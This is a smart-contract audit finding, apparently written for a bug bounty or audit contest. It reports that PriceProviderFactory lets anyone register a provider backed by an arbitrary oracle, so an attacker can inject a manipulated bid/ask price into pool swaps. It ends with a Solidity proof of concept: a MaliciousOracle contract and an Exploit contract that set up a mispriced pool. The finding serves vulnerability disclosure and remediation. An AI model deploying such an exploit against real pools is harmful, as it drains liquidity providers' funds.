### Title
Unvalidated Oracle Address in `PriceProviderFactory.createPriceProvider` Allows Arbitrary Bid/Ask Injection into Pool Swaps — (`smart-contracts-poc/contracts/PriceProviderFactory.sol`)

---

### Summary

`PriceProviderFactory.createPriceProvider` accepts the `_oracle` address as a raw, unchecked user input with no allowlist validation. Any caller can deploy a factory-tracked `PriceProvider` backed by a malicious oracle contract. Because `PriceProviderFactory.isProvider()` returns `true` for every provider created through the factory — regardless of oracle legitimacy — a malicious provider passes the factory eligibility predicate and can be used in a pool. During swap execution, the pool calls `getBidAndAskPrice()` on whatever provider is set; a malicious oracle can return an arbitrary `mid` price, causing bad-price execution and LP fund loss.

---

### Finding Description

`AnchoredProviderFactory.createAnchoredProvider` enforces an explicit oracle allowlist before deploying any provider:

```solidity
// AnchoredProviderFactory.sol line 168
if (!_oracles.contains(oracle)) revert OracleNotAllowed(oracle);
```

`PriceProviderFactory.createPriceProvider` performs **no such check**:

```solidity
// PriceProviderFactory.sol lines 41-57
function createPriceProvider(
    address _oracle,   // ← accepted verbatim, never validated
    bytes32 _feedId,
    int256  _marginStep,
    uint256 _maxTimeDelta,
    address _baseToken,
    address _quoteToken
) external override returns (address provider) {
    PriceProvider p = new PriceProvider(
        address(this),
        _oracle,       // ← forwarded directly to PriceProvider constructor
        ...
    );
    _providers.add(provider);   // ← immediately tracked as legitimate
    providerOwner[provider] = creator;
``` [1](#0-0) 

The resulting provider is immediately added to `_providers`, so `isProvider()` returns `true` for it — the same predicate `AnchoredProviderFactory` documents as the "public-pool eligibility" gate. [2](#0-1) 

Inside `PriceProvider._getBidAndAskPrice`, every guard delegates back to the attacker-controlled oracle:

```solidity
// PriceProvider.sol lines 194-212
(uint256 mid, uint256 spread, , uint256 refTime) =
    IPricedOracle(address(offchainOracle)).price(offchainFeedId, msg.sender);

if (_isStale(refTime, block.timestamp, MAX_TIME_DELTA)) { ... }   // oracle controls refTime
if (mid == 0 || spread >= ORACLE_BPS) { ... }                     // oracle controls mid, spread
(uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(offchainFeedId); // oracle controls bounds
``` [3](#0-2) 

A malicious oracle returns `refTime = block.timestamp` (fresh), `mid = <attacker-chosen>`, `spread = 1`, `guardMin = 0`, `guardMax = type(uint128).max`. The attacker, as `providerOwner`, calls `PriceProviderFactory.setConfidence([provider], [nonzero])` to set `confidenceParam`, enabling a non-zero spread and a valid `bid < ask` output. The resulting bid/ask is entirely attacker-controlled.

The pool's swap path calls this provider unconditionally:

```solidity
// MetricOmmPool.sol lines 804-813
function _getBidAndAskPriceX64() internal returns (uint128 bidPriceX64, uint128 askPriceX64) {
    address activePriceProvider = _resolvedPriceProvider();
    try IPriceProvider(activePriceProvider).getBidAndAskPrice() returns (uint128 bid, uint128 ask) {
        if (bid >= ask) revert BidGreaterThanAsk();
        if (bid == 0) revert BidIsZero();
        return (bid, ask);
    } catch (bytes memory reason) {
        revert PriceProviderFailed(reason);
    }
}
``` [4](#0-3) 

The only pool-side guards (`bid >= ask`, `bid == 0`) are trivially satisfied by the malicious oracle.

---

### Impact Explanation

**High.** An attacker-controlled bid/ask price drives all swap math in `SwapMath.midAndSpreadFeeX64FromBidAsk` and the bin-traversal loop. Setting `mid` to a fraction of the real price makes token0 appear artificially cheap: traders buying token0 drain LP token0 reserves while paying far less token1 than the real price warrants. Setting `mid` to an extreme high value causes the inverse. In either case, LP principal is extracted at the expense of the pool's bin balances, satisfying the "direct loss of user principal / LP assets" impact gate.

---

### Likelihood Explanation

**Medium.** `createPriceProvider` is fully permissionless — no role, no fee, no timelock. The attacker needs only to deploy a malicious oracle contract (~50 lines of Solidity), call `createPriceProvider`, and either (a) create a new pool using the malicious provider (if the pool factory uses `isProvider()` as its eligibility gate, which is the documented design pattern) or (b) wait for the factory to call `setPriceProvider` on a mutable-provider pool with the attacker's provider. Path (a) is entirely unprivileged.

---

### Recommendation

Mirror the `AnchoredProviderFactory` pattern: maintain an admin-curated oracle allowlist in `PriceProviderFactory` and revert in `createPriceProvider` if the supplied oracle is not on the list:

```solidity
EnumerableSet.AddressSet private _oracles;

function addOracle(address oracle) external onlyRole(ADMIN_ROLE) {
    require(_oracles.add(oracle));
}

function createPriceProvider(address _oracle, ...) external {
    if (!_oracles.contains(_oracle)) revert OracleNotAllowed(_oracle);
    ...
}
``` [5](#0-4)

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// 1. Deploy malicious oracle
contract MaliciousOracle {
    function price(bytes32, address)
        external view
        returns (uint256 mid, uint256 spread, uint256, uint256 refTime)
    {
        // Return an artificially low mid price (1e4 = 0.0001 in 8-decimal terms)
        // making token0 appear 10,000x cheaper than reality
        return (1e4, 1, 0, block.timestamp);
    }
    function priceGuard(bytes32) external pure returns (uint128, uint128) {
        return (0, type(uint128).max); // no guard
    }
}

// 2. Attacker flow (no privileged role required)
contract Exploit {
    function run(
        PriceProviderFactory factory,
        address baseToken,
        address quoteToken,
        MetricOmmPoolFactory poolFactory
    ) external {
        MaliciousOracle oracle = new MaliciousOracle();

        // createPriceProvider accepts _oracle with no allowlist check
        address provider = factory.createPriceProvider(
            address(oracle),
            bytes32(0),   // feedId — oracle ignores it
            0,            // marginStep
            1 days,       // maxTimeDelta
            baseToken,
            quoteToken
        );

        // Set confidenceParam so bid < ask (attacker is providerOwner)
        factory.setConfidence(
            _toArray(provider),
            _toArray(500_000)   // 50x multiplier → wide spread, valid bid < ask
        );

        // isProvider() returns true — passes any factory eligibility gate
        assert(factory.isProvider(provider));

        // Create pool with malicious provider; pool factory uses isProvider() as gate
        // Pool now quotes token0 at 1/10000 of real price during every swap
        poolFactory.createPool(baseToken, quoteToken, provider, ...);
    }
}
```

During any subsequent swap on the pool, `_getBidAndAskPriceX64()` calls the malicious provider, which calls `MaliciousOracle.price()`, returning `mid = 1e4`. After `confidenceParam`-based spread and Q64 conversion, the pool executes at a price ~10,000× below fair value, allowing the attacker (or any informed trader) to drain LP token0 reserves by paying a negligible amount of token1.
